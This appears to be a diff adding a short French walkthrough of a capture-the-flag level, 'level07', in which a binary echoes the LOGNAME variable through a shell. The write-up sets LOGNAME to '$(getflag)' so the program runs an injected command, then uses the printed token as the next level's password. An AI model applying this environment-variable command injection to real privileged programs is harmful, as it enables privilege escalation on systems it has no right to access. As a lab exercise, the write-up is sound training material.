@@ -1,0 +1,28 @@
+LEVEL 07
+--------
+
+1.  Commande:   ls
+    Sortie:     level07
+    
+    On va utiliser l'exécutable.
+
+2.  On lance l'exécutable level07.
+    Commande:   ./level07
+    Sortie:     level07
+
+3.  On va utiliser strings pour analyser.
+    Commande:   strings level07
+    Sortie:     LOGNAME
+                /bin/echo %s
+    
+    Le fichier affiche le LOGNAME de la session.
+
+4.  On change le LOGNAME par le getflag.
+    Commande:   LOGNAME=$\(getflag\)
+
+5.  On relance l'exécutable.
+    Commande:   ./level07
+    Sortie:     Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+6.  Commande:   su level08
+    Mdp:        fiumuikeil55xe9cu4dood66h
